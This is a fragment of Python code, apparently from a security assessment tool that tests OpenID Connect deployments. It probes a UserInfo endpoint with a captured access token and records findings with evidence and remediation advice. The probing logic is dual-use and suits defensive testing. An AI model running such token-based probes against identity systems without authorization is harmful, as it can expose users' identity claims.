            stream("info", f"Token claims analysed — sub={sub}, iss={iss}, aud={aud}")

        # ── sub enum ──
        if "sub_enum" in attacks and userinfo_ep and access_token:
            stream("info", "Testing sub claim enumeration via UserInfo...)  ")
            code, body, _ = self._probe_url(userinfo_ep, {"Authorization": f"Bearer {access_token}"})
            raw_lines.append(f"userinfo: HTTP {code}")
            if code == 200:
                findings.append({
                    "title": "UserInfo endpoint accessible with captured token",
                    "severity": "info",
                    "url": userinfo_ep,
                    "description": "UserInfo endpoint returned claims. Review for over-exposure.",
                    "evidence": body[:1000],
                    "remediation": "Limit UserInfo endpoint claims to those strictly needed by the RP.",
                })
                stream("success", "UserInfo claims retrieved")

        if not findings:
            findings.append({
                "title": "No OIDC vulnerabilities confirmed — manual review recommended",
                "severity": "info",
                "url": auth_ep,
                "description": "Tested attack vectors were not confirmed. Continue manual OIDC review.",
                "evidence": "\n".join(raw_lines),
                "remediation": "Follow OIDC Security Best Practices (OpenID Foundation BCP).",
            })

        stream("success", f"OIDC abuse tests complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}
